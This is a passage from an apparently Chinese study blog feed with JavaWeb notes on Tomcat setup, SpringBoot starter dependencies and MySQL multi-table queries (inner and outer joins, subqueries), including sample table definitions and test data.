data.toString().getBytes(StandardCharsets.UTF_8).length;</span><br><span class="line"></span><br><span class="line">            writer.write(&quot;HTTP/1.1 200 OK\r\n&quot;);</span><br><span class="line">            writer.write(&quot;Connection: keep-alive\r\n&quot;);</span><br><span class="line">            writer.write(&quot;Content-Type: text/html\r\n&quot;);</span><br><span class="line">            writer.write(&quot;Content-Length: &quot; + length + &quot;\r\n&quot;);</span><br><span class="line">            writer.write(&quot;\r\n&quot;); // 空行标识Header和Body的分隔</span><br><span class="line">            writer.write(data.toString());</span><br><span class="line">            writer.flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在开发中真正用到的，都是使用目前比较流行的web服务器。如：<strong>Tomcat</strong></li>
</ul>
<h4 id="Web服务器-Tomcat"><a class="header-anchor" href="#Web服务器-Tomcat">¶</a>Web服务器-Tomcat</h4>
<h5 id="服务器概述"><a class="header-anchor" href="#服务器概述">¶</a>服务器概述</h5>
<ul>
<li>
<p>服务器，也称伺服器。是提供计算服务的设备</p>
</li>
<li>
<p>由于服务器需要<strong>响应服务请求，并进行处理</strong>，因此一般来说服务器应具备<u>承担服务并且保障服务的能力</u></p>
</li>
<li>
<p>服务器的<strong>构成</strong>包括处理器、硬盘、内存、系统总线等，和通用的计算机架构类似，但是由于需要<strong>提供高可靠的服务</strong>，因此<u>在处理能力、稳定性、可靠性、安全性、可扩展性、可管理性等方面要求较高</u></p>
</li>
<li>
<p>在网络环境下，根据服务器提供的<strong>服务类型不同</strong>，可分为：<u>文件服务器，数据库服务器，应用程序服务器，WEB服务器等</u></p>
</li>
<li>
<p>服务器只是一台设备，必须安装<u>服务器软件</u>才能提供相应的服务</p>
</li>
</ul>
<h5 id="Web服务器"><a class="header-anchor" href="#Web服务器">¶</a>Web服务器</h5>
<ul>
<li>
<p>Web服务器是一个应用程序(软件)</p>
<ul>
<li>①对HTTP协议的操作进行封装</li>
<li>②使得程序员不必直接对协议进行操作(不用程序员自己写代码去解析http协议规则)，让Web开发更加便捷。</li>
<li>③主要功能是&quot;提供网上信息浏览服务&quot;</li>
</ul>
</li>
<li>
<p>Web服务器是安装在<strong>服务器端</strong>的一款软件，将来把自己写的<strong>Web项目</strong>部署到<strong>Tomcat服务器软件</strong>中</p>
<ul>
<li>当Web服务器软件启动后，部署在Web服务器软件中的页面就可以直接通过<strong>浏览器</strong>来访问了</li>
</ul>
</li>
<li>
<p><strong>Web服务器软件使用步骤</strong></p>
<ul>
<li>准备静态资源</li>
<li>下载安装Web服务器软件</li>
<li>将<strong>静态资源</strong>部署到Web服务器上</li>
<li>启动Web服务器<strong>使用浏览器访问</strong>对应的资源</li>
</ul>
</li>
</ul>
<h5 id="Tomcat"><a class="header-anchor" href="#Tomcat">¶</a>Tomcat</h5>
<blockquote>
<p>学习方向</p>
<ul>
<li>初步认识Tomcat</li>
<li>Tomcat的基本使用：安装、卸载、启动、关闭、配置和项目部署</li>
<li>IDEA创建Maven Web项目</li>
<li>IDEA使用Tomcat</li>
</ul>
</blockquote>
<ul>
<li>JavaWeb程序需要依赖Tomcat才能运行</li>
<li><a href="https://tomcat.apache.org/">Tomcat官网</a></li>
</ul>
<h6 id="Tomcat目录结构和基本使用"><a class="header-anchor" href="#Tomcat目录结构和基本使用">¶</a>Tomcat目录结构和基本使用</h6>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin			可执行文件</span><br><span class="line">conf			配置文件</span><br><span class="line">lib			Tomcat依赖的jar包</span><br><span class="line">logs			日志文件</span><br><span class="line">temp			临时文件</span><br><span class="line">webapps			应用发布目录</span><br><span class="line">work			工作目录</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>bin</code>：目录下有两类文件，一种是以<code>.bat</code>结尾的，是Windows系统的可执行文件，一种是以<code>.sh</code>结尾的，是Linux系统的可执行文件</p>
</li>
<li>
<p><code>webapps</code>：之后项目部署的目录</p>
</li>
<li>
<p><code>卸载</code>：直接删除目录</p>
</li>
<li>
<p><code>启动Tomcat</code>：双击<code>/bin/startup.bat</code></p>
<blockquote>
<p>Tomcat服务器启动后，黑窗口不关闭，就说明tomcat服务器正在运行</p>
</blockquote>
</li>
<li>
<p><code>关闭Tomcat</code>：</p>
<ul>
<li>不建议：直接×掉窗口</li>
<li>正常关闭：<code>bin/shutdown.bat</code></li>
<li>正常关闭：在Tomcat启动窗口按下Ctrl+C</li>
</ul>
</li>
</ul>
<h6 id="Tomcat常见问题"><a class="header-anchor" href="#Tomcat常见问题">¶</a>Tomcat常见问题</h6>
<ol>
<li>Tomcat启动时，窗口一闪而过</li>
</ol>
<ul>
<li>检查环境变量<code>JAVA_HOME</code>环境变量是否正确配置</li>
</ul>
<ol start="2">
<li>端口号冲突</li>
</ol>
<ul>
<li>换Tomcat端口号
<ul>
<li>修改<code>conf/server.xml</code>    <code>&lt;Connector port=&quot;8080&quot; ...... /&gt;</code></li>
</ul>
</li>
<li>注： HTTP协议默认端口号为80，如果将Tomcat端口号改为80，则将来访问Tomcat时，将不用输入端口号</li>
</ul>
<h4 id="SpringBoot入门程序解析"><a class="header-anchor" href="#SpringBoot入门程序解析">¶</a>SpringBoot入门程序解析</h4>
<ul>
<li>
<p><a href="https://start.spring.io/">Spring官方骨架</a>    Spring官方为程序员提供一个搭建项目的模板</p>
</li>
<li>
<p>Spring官方生成的SpringBoot项目，解压缩后，就会得到一个SpringBoot项目工程</p>
</li>
<li>
<p>打开pom.xml文件，可以看到springboot项目中引入了<code>web依赖</code>和<code>test依赖</code></p>
</li>
<li>
<p><code>起步依赖</code>：</p>
<ul>
<li>
<p>以<code>spring-boot-starter-</code>作为开头</p>
</li>
<li>
<p><code>spring-boot-starter-web</code>：包含了web应用开发所需要的常见依赖</p>
</li>
<li>
<p><code>spring-boot-starter-test</code>：包含了单元测试所需要的常见依赖</p>
</li>
<li>
<p>Spring官方提供很多现成的starter (起步依赖)</p>
</li>
<li>
<p>每一个起步依赖，都用于开发一个特定的功能</p>
<blockquote>
<p>举例：当我们开发中需要使用redis数据库时，只需要在SpringBoot项目中，引入：spring-boot-starter-redis ，即可导入redis开发所需要的依赖</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><a href="https://docs.spring.io/spring-boot/docs/2.7.2/reference/htmlsingle/#using.build-systems.starters">Spring Boot Reference Documentation</a>  SpringBoot官方文档</p>
</li>
<li>
<p><strong>SpringBoot父工程</strong></p>
<ul>
<li>通过maven引入的依赖，没有指定具体的依赖版本号，但是没有指定<version>版本号仍能正常使用</version></li>
<li>∵每一个SpringBoot工程，都有一个父工程</li>
<li>依赖的版本号，在父工程中统一管理</li>
</ul>
</li>
<li>
<p><strong>内嵌Tomcat</strong></p>
<ul>
<li>在SpringBoot中引入了web运行环境（也就是引入spring-boot-starter-web起步依赖），其内部已经集成了内置的Tomcat服务器</li>
<li>可通过IDEA开发工具右侧的maven面板看到当前工程引入的依赖。</li>
<li>其中已将Tomcat的相关依赖传递下来，即在SpringBoot中可以直接使用Tomcat服务器</li>
<li>内嵌Tomcat：<code>Dependencies→org.springframework.boot:spring-boot-starter-web→org.springframework.boot:spring-boot-starter-tomcat</code></li>
<li>运行SpringBoot的引导类时（运行main方法），就会看到命令行输出的日志</li>
</ul>
</li>
</ul>
<h3 id="Day04-作业"><a class="header-anchor" href="#Day04-作业">¶</a>Day04-作业</h3>
<ul>
<li><a href="https://heuqqdmbyk.feishu.cn/docx/OEyKdHzt1oZuCtxuChBcoKqWnlb">‍⁠⁠‬‍⁠﻿‬﻿﻿‍﻿‬‬‍‍⁠‌‍﻿‌‬‍‬‍‍Day04-作业 - 飞书云文档 (feishu.cn)</a></li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>Java notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Java</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>【JavaWeb】Day08--MySQL-Mybatis入门</title>
    <url>/2024/09/09/CS_Notes/Java/%E3%80%90JavaWeb%E3%80%91Day08--MySQL-Mybatis%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li><a href="https://aigz8jy30yo.feishu.cn/docx/BtbOd3c5aotnpdxYTVDcnqQanxd">‍‌‍‍‬‬‌﻿﻿‌‌‬‬‌﻿⁠⁠‍‌⁠‬‍‍⁠‍‬⁠﻿‍JavaWeb 开发教程 - 飞书云文档 (feishu.cn)</a></li>
<li>需要记录的内容的标准：
<ul>
<li>已掌握的概念不记</li>
<li>太长的缩短记</li>
</ul>
</li>
<li>按照期末考前的笔记选择标准来记：
<ul>
<li>只记关键核心内容，有助于复习笔记时快速重温掌握</li>
<li>对于较长的内容，尽可能用自己的话复述</li>
</ul>
</li>
<li>努力克服完美强迫症</li>
<li><a href="https://www.runoob.com/vue3/vue3-tutorial.html">Vue3 教程 | 菜鸟教程 (runoob.com)</a></li>
<li><a href="https://element.eleme.cn/#/zh-CN">Element - 网站快速成型工具</a></li>
</ul>
<h3 id="Day08–作业"><a class="header-anchor" href="#Day08–作业">¶</a>Day08–作业</h3>
<ul>
<li><a href="https://heuqqdmbyk.feishu.cn/docx/TjJkdW6ouofZsrxuquuc9kjZn7e">﻿⁠⁠⁠﻿⁠‌‍‬﻿‍‍‍‍‍‍‬‬‬‬‌‌‍‍﻿﻿⁠‌‬⁠‬﻿Day08-作业 - 飞书云文档 (feishu.cn)</a></li>
</ul>
<h1>Day08–MySQL-Mybatis入门</h1>
<h2 id="数据库开发-MySQL"><a class="header-anchor" href="#数据库开发-MySQL">¶</a>数据库开发-MySQL</h2>
<h3 id="多表查询"><a class="header-anchor" href="#多表查询">¶</a>多表查询</h3>
<h4 id="数据准备"><a class="header-anchor" href="#数据准备">¶</a>数据准备</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#建议：创建新的数据库</span><br><span class="line"><span class="keyword">create</span> database db04;</span><br><span class="line">use db04;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 部门表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_dept</span><br><span class="line">(</span><br><span class="line">    id          <span class="type">int</span> unsigned <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">    name        <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span> comment <span class="string">&#x27;部门名称&#x27;</span>,</span><br><span class="line">    create_time datetime    <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time datetime    <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;修改时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;部门表&#x27;</span>;</span><br><span class="line"><span class="comment">-- 部门表测试</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_dept (id, name, create_time, update_time)</span><br><span class="line"><span class="keyword">values</span> (<span class="number">1</span>, <span class="string">&#x27;学工部&#x27;</span>, now(), now()),</span><br><span class="line">       (<span class="number">2</span>, <span class="string">&#x27;教研部&#x27;</span>, now(), now()),</span><br><span class="line">       (<span class="number">3</span>, <span class="string">&#x27;咨询部&#x27;</span>, now(), now()),</span><br><span class="line">       (<span class="number">4</span>, <span class="string">&#x27;就业部&#x27;</span>, now(), now()),</span><br><span class="line">       (<span class="number">5</span>, <span class="string">&#x27;人事部&#x27;</span>, now(), now());</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 员工表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_emp</span><br><span class="line">(</span><br><span class="line">    id          <span class="type">int</span> unsigned <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">    username    <span class="type">varchar</span>(<span class="number">20</span>)      <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span> comment <span class="string">&#x27;用户名&#x27;</span>,</span><br><span class="line">    password    <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">default</span> <span class="string">&#x27;123456&#x27;</span> comment <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">    name        <span class="type">varchar</span>(<span class="number">10</span>)      <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    gender      tinyint unsigned <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;性别, 说明: 1 男, 2 女&#x27;</span>,</span><br><span class="line">    image       <span class="type">varchar</span>(<span class="number">300</span>) comment <span class="string">&#x27;图像&#x27;</span>,</span><br><span class="line">    job         tinyint unsigned comment <span class="string">&#x27;职位, 说明: 1 班主任,2 讲师, 3 学工主管, 4 教研主管, 5 咨询师&#x27;</span>,</span><br><span class="line">    entrydate   <span class="type">date</span> comment <span class="string">&#x27;入职时间&#x27;</span>,</span><br><span class="line">    dept_id     <span class="type">int</span> unsigned comment <span class="string">&#x27;部门ID&#x27;</span>,</span><br><span class="line">    create_time datetime         <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time datetime         <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;修改时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;员工表&#x27;</span>;</span><br><span class="line"><span class="comment">-- 员工表测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tb_emp(id, username, password, name, gender, image, job, entrydate,dept_id, create_time, update_time) </span><br><span class="line"><span class="keyword">VALUES</span> </span><br><span class="line">(<span class="number">1</span>,<span class="string">&#x27;jinyong&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;金庸&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;1.jpg&#x27;</span>,<span class="number">4</span>,<span class="string">&#x27;2000-01-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">2</span>,<span class="string">&#x27;zhangwuji&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;张无忌&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;2.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2015-01-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">3</span>,<span class="string">&#x27;yangxiao&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;杨逍&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;3.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2008-05-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">4</span>,<span class="string">&#x27;weiyixiao&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;韦一笑&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;4.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2007-01-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">5</span>,<span class="string">&#x27;changyuchun&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;常遇春&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;5.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2012-12-05&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">6</span>,<span class="string">&#x27;xiaozhao&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;小昭&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;6.jpg&#x27;</span>,<span class="number">3</span>,<span class="string">&#x27;2013-09-05&#x27;</span>,<span class="number">1</span>,now(),now()),</span><br><span class="line">(<span class="number">7</span>,<span class="string">&#x27;jixiaofu&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;纪晓芙&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;7.jpg&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;2005-08-01&#x27;</span>,<span class="number">1</span>,now(),now()),</span><br><span class="line">(<span class="number">8</span>,<span class="string">&#x27;zhouzhiruo&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;周芷若&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;8.jpg&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;2014-11-09&#x27;</span>,<span class="number">1</span>,now(),now()),</span><br><span class="line">(<span class="number">9</span>,<span class="string">&#x27;dingminjun&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;丁敏君&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;9.jpg&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;2011-03-11&#x27;</span>,<span class="number">1</span>,now(),now()),</span><br><span class="line">(<span class="number">10</span>,<span class="string">&#x27;zhaomin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;赵敏&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;10.jpg&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;2013-09-05&#x27;</span>,<span class="number">1</span>,now(),now()),</span><br><span class="line">(<span class="number">11</span>,<span class="string">&#x27;luzhangke&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;鹿杖客&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;11.jpg&#x27;</span>,<span class="number">5</span>,<span class="string">&#x27;2007-02-01&#x27;</span>,<span class="number">3</span>,now(),now()),</span><br><span class="line">(<span class="number">12</span>,<span class="string">&#x27;hebiweng&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;鹤笔翁&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;12.jpg&#x27;</span>,<span class="number">5</span>,<span class="string">&#x27;2008-08-18&#x27;</span>,<span class="number">3</span>,now(),now()),</span><br><span class="line">(<span class="number">13</span>,<span class="string">&#x27;fangdongbai&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;方东白&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;13.jpg&#x27;</span>,<span class="number">5</span>,<span class="string">&#x27;2012-11-01&#x27;</span>,<span class="number">3</span>,now(),now()),</span><br><span class="line">(<span class="number">14</span>,<span class="string">&#x27;zhangsanfeng&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;张三丰&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;14.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2002-08-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">15</span>,<span class="string">&#x27;yulianzhou&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;俞莲舟&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;15.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2011-05-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">16</span>,<span class="string">&#x27;songyuanqiao&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;宋远桥&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;16.jpg&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;2007-01-01&#x27;</span>,<span class="number">2</span>,now(),now()),</span><br><span class="line">(<span class="number">17</span>,<span class="string">&#x27;chenyouliang&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;陈友谅&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;17.jpg&#x27;</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;2015-03-21&#x27;</span>,<span class="keyword">NULL</span>,now(),now());</span><br></pre></td></tr></table></figure>
<h4 id="介绍"><a class="header-anchor" href="#介绍">¶</a>介绍</h4>
<ul>
<li>
<p>多表查询</p>
<blockquote>
<p>单表查询的SQL语句：select  字段列表  from  表名;</p>
<p>执行多表查询，如： select   字段列表  from  表1, 表2</p>
</blockquote>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询用户表和部门表中的数据</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp, tb_dept;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>多表查询的结果：两表记录的笛卡尔积</p>
</li>
<li>
<p>笛卡尔积</p>
<blockquote>
<p>两个集合(A集合和B集合)的所有组合情况</p>
<p>在多表查询时，需要消除无效的笛卡尔积，只保留表关联部分的数据</p>
</blockquote>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 给多表查询加上连接查询的条件</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp , tb_dept <span class="keyword">where</span> tb_emp.dept_id <span class="operator">=</span> tb_dept.id ;</span><br></pre></td></tr></table></figure>
<h4 id="多表查询的分类"><a class="header-anchor" href="#多表查询的分类">¶</a>多表查询的分类</h4>
<ul>
<li>连接查询
<ul>
<li>内连接：查询A、B交集部分数据</li>
</ul>
</li>
<li>外连接
<ul>
<li>左外连接：左表所有记录+两表交集数据</li>
<li>右外连接：右表所有记录+两表交集数据</li>
</ul>
</li>
<li>子查询</li>
</ul>
<h4 id="内连接"><a class="header-anchor" href="#内连接">¶</a>内连接</h4>
<ul>
<li>语法上可分为：
<ul>
<li>隐式内连接</li>
<li>显式内连接</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 隐式内连接</span></span><br><span class="line"><span class="keyword">select</span> 字段列表 <span class="keyword">from</span> 表<span class="number">1</span>, 表<span class="number">2</span> <span class="keyword">where</span> 条件...</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 显式内连接</span></span><br><span class="line"><span class="keyword">select</span>  字段列表  <span class="keyword">from</span>  表<span class="number">1</span>  [ <span class="keyword">inner</span> ]  <span class="keyword">join</span> 表<span class="number">2</span>  <span class="keyword">on</span>  连接条件 ... ;</span><br></pre></td></tr></table></figure>
<ul>
<li>例子：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 隐式内连接实现查询员工姓名以及所属部门</span></span><br><span class="line"><span class="keyword">select</span> tb_emp.name , tb_dept.name <span class="comment">-- 分别查询两张表中的数据</span></span><br><span class="line"><span class="keyword">from</span> tb_emp , tb_dept <span class="comment">-- 关联两张表</span></span><br><span class="line"><span class="keyword">where</span> tb_emp.dept_id <span class="operator">=</span> tb_dept.id; <span class="comment">-- 消除笛卡尔积</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 显式内连接实现查询员工姓名以及所属部门</span></span><br><span class="line"><span class="keyword">select</span> tb_emp.name, tb_dept.name</span><br><span class="line"><span class="keyword">from</span> tb_emp <span class="keyword">inner</span> <span class="keyword">join</span> tb_dept</span><br><span class="line"><span class="keyword">on</span> tb_emp.dept_id <span class="operator">=</span> tb_dept.id;</span><br></pre></td></tr></table></figure>
<ul>
<li>多表查询时给表起别名：
<ul>
<li><code>tableA  (as) 别名1  ,  tableB  (as)  别名2 ;</code></li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>注意</strong>:</p>
<p>为表起了别名后，就不能再用表名来指定对应的字段</p>
<p>此时<strong>只能使用别名</strong>来指定字段</p>
</blockquote>
<h4 id="外连接"><a class="header-anchor" href="#外连接">¶</a>外连接</h4>
<ul>
<li>分为两种：<code>左外连接</code>和<code>右外连接</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 左外连接</span></span><br><span class="line"><span class="keyword">select</span>  字段列表   <span class="keyword">from</span>   表<span class="number">1</span>  <span class="keyword">left</span>  [ <span class="keyword">outer</span> ]  <span class="keyword">join</span> 表<span class="number">2</span>  <span class="keyword">on</span>  连接条件 ... ;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>左外连接=查询表1(左表)的所有数据+表1和表2交集部分数据</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--　右外连接</span></span><br><span class="line"><span class="keyword">select</span>  字段列表   <span class="keyword">from</span>   表<span class="number">1</span>  <span class="keyword">right</span>  [ <span class="keyword">outer</span> ]  <span class="keyword">join</span> 表<span class="number">2</span>  <span class="keyword">on</span>  连接条件 ... ;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>右外连接=查询表2(右表)的所有数据+表1和表2交集部分数据</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 案例：查询员工表中所有员工的姓名, 和对应的部门名称</span></span><br><span class="line"><span class="comment">-- 左外连接：以left join关键字左边的表为主表，查询主表中所有数据，以及和主表匹配的右边表中的数据</span></span><br><span class="line"><span class="keyword">select</span> emp.name , dept.name</span><br><span class="line"><span class="keyword">from</span> tb_emp <span class="keyword">AS</span> emp <span class="keyword">left</span> <span class="keyword">join</span> tb_dept <span class="keyword">AS</span> dept</span><br><span class="line">     <span class="keyword">on</span> emp.dept_id <span class="operator">=</span> dept.id;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 案例：查询部门表中所有部门的名称, 和对应的员工名称</span></span><br><span class="line"><span class="comment">-- 右外连接</span></span><br><span class="line"><span class="keyword">select</span> dept.name , emp.name</span><br><span class="line"><span class="keyword">from</span> tb_emp <span class="keyword">AS</span> emp <span class="keyword">right</span> <span class="keyword">join</span>  tb_dept <span class="keyword">AS</span> dept</span><br><span class="line">     <span class="keyword">on</span> emp.dept_id <span class="operator">=</span> dept.id;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>注意</strong>：</p>
<p>左外连接和右外连接可相互替换</p>
<p>只需调整连接查询时SQL语句中表的先后顺序</p>
<p>在日常开发使用时，更偏向于左外连接</p>
</blockquote>
<h4 id="子查询"><a class="header-anchor" href="#子查询">¶</a>子查询</h4>
<ul>
<li>SQL语句中嵌套<code>select</code>语句，称为<strong>嵌套查询</strong>，又称<strong>子查询</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  <span class="operator">*</span>  <span class="keyword">FROM</span>   t1   <span class="keyword">WHERE</span>  column1 <span class="operator">=</span>  ( <span class="keyword">SELECT</span>  column1  <span class="keyword">FROM</span>  t2 ... );</span><br></pre></td></tr></table></figure>
<blockquote>
<p>子查询外部的语句可以是insert / update / delete / select</p>
<p>最常见:  select</p>
</blockquote>
<ul>
<li>
<p>根据子查询结果的分类：</p>
<ul>
<li>
<p>标量子查询</p>
<blockquote>
<p>（子查询结果为单个值[一行一列]）</p>
</blockquote>
</li>
<li>
<p>列子查询</p>
<blockquote>
<p>（子查询结果为一列，但可以是多行）</p>
</blockquote>
</li>
<li>
<p>行子查询</p>
<blockquote>
<p>（子查询结果为一行，但可以是多列）</p>
</blockquote>
</li>
<li>
<p>表子查询</p>
<blockquote>
<p>（子查询结果为多行多列[相当于子查询结果是一张表]）</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>子查询可以书写的位置：</p>
<ol>
<li>where之后</li>
<li>from之后</li>
<li>select之后</li>
</ol>
</li>
</ul>
<h5 id="标量子查询"><a class="header-anchor" href="#标量子查询">¶</a>标量子查询</h5>
<ul>
<li>结果是单个值(数字、字符串、日期等)</li>
<li>常用的操作符： <code>=</code>  <code> &lt;&gt;</code>   <code>&gt; </code>   <code>&gt;=</code>    <code>&lt;</code>   <code>&lt;=</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 案例1：查询&quot;教研部&quot;的所有员工信息</span></span><br><span class="line"><span class="comment">-- 可以将需求分解为两步：</span></span><br><span class="line"><span class="comment">-- -- 查询 &quot;教研部&quot; 部门ID</span></span><br><span class="line"><span class="comment">-- -- &quot;教研部&quot; 部门ID，查询员工信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 1.查询&quot;教研部&quot;部门ID</span></span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> tb_dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;教研部&#x27;</span>;    <span class="comment">-- 查询结果：2</span></span><br><span class="line"><span class="comment">-- 2.根据&quot;教研部&quot;部门ID, 查询员工信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> dept_id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 合并出上两条SQL语句</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> dept_id <span class="operator">=</span> (<span class="keyword">select</span> id <span class="keyword">from</span> tb_dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;教研部&#x27;</span>);</span><br></pre></td></tr></table></figure>
